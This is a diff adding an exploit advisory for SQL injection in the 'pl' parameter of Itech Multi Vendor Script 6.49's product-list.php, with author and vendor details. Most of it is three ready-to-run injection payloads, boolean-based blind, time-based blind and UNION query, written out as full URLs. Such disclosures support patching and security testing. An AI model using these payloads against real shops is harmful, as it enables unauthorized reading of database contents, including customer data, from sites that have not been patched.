@@ -1,0 +1,35 @@
+Exploit Title: Itech Multi Vendor Script 6.49 – SQL Injection
+Date: 30.01.2017
+Vendor Homepage: http://itechscripts.com/
+Software Link: http://itechscripts.com/multi-vendor-shopping-script/
+Exploit Author: Kaan KAMIS
+Contact: iletisim[at]k2an[dot]com
+Website: http://k2an.com
+Category: Web Application Exploits
+
+Overview
+
+Multi Vendor Script v6.49 offers a robust eCommerce platform. The script has been designed to deliver all major features required to run an eCommerce website.
+
+Type of vulnerability:
+
+An SQL Injection vulnerability in Itech Multi Vendor Script 6.49 allows attackers to read
+arbitrary data from the database.
+
+Vulnerability:
+
+http://localhost/multi-vendor-shopping-script/product-list.php?pl=[payload]
+
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: http://localhost/multi-vendor-shopping-script/product-list.php?pl=11201ff1de774005f8da13f42943881c655f' RLIKE (SELECT (CASE WHEN (6851=6851) THEN 0x313132303166663164653737343030356638646131336634323934333838316336353566 ELSE 0x28 END))-- HnQm
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: http://localhost/multi-vendor-shopping-script/product-list.php?pl=11201ff1de774005f8da13f42943881c655f' AND SLEEP(5)-- WHze
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: http://localhost/multi-vendor-shopping-script/product-list.php?pl=-3569' UNION ALL SELECT CONCAT(0x716b6a7871,0x7573485a716b767347544870695571415a465846434b5541777566416a6571656d6a5a6c62526f47,0x7170627171),NULL,NULL,NULL,NULL#
+---
